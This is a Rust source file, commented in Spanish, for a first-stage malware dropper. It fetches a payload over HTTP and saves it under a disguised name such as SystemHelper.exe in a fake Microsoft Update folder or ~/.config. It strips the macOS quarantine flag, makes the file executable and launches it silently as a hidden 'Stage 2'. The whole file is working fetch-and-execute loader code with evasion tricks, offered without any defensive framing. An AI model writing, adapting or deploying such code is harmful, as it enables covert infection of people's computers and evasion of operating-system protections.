// stage1/src/main.rs (VERSIÓN FUNCIONAL CON SPAWN Y LOGS)
use std::fs::{self, File};
use std::io::Write;
use std::process::Command;
use std::process::Stdio;
use std::env;

fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("📥 Descargando payload desde: http://localhost:8080/payload");

    let url = "http://localhost:8080/payload";
    let response = reqwest::blocking::get(url)?;
    let bytes = response.bytes()?;
    println!("✅ Payload descargado ({} bytes)", bytes.len());

    let home = env::var("HOME").or_else(|_| env::var("USERPROFILE"))?;

    let (dir, filename) = match env::consts::OS {
        "windows" => (format!("{}\\AppData\\Local\\Microsoft\\Update", home), "SystemHelper.exe"),
        "macos"   => (format!("{}/.config", home), "SystemHelper"),
        "linux"   => (format!("{}/.config", home), "system-helper"),
        _         => (env::temp_dir().to_str().unwrap().to_string(), "SystemHelper"),
    };

    fs::create_dir_all(&dir)?;
    let path = format!("{}/{}", dir, filename);
    let mut file = File::create(&path)?;
    file.write_all(&bytes)?;
    println!("✅ Archivo guardado en: {}", path);

    // === EJECUTAR PAYLOAD ===
    #[cfg(target_os = "windows")]
    {
        Command::new(&path)
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .spawn()?;
    }

    #[cfg(any(target_os = "macos", target_os = "linux"))]
    {
        use std::os::unix::fs::PermissionsExt;
        let mut perms = std::fs::metadata(&path)?.permissions();
        perms.set_mode(0o755);
        std::fs::set_permissions(&path, perms)?;

        // Quitar cuarentena (macOS)
        #[cfg(target_os = "macos")]
        {
            let _ = Command::new("xattr")
                .args(&["-dr", "com.apple.quarantine", &path])
                .output();
        }

        println!("🚀 Ejecutando payload...");
        Command::new(&path)
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .spawn()?;
    }

    println!("✅ Stage 2 ejecutándose en background");
    Ok(())
}
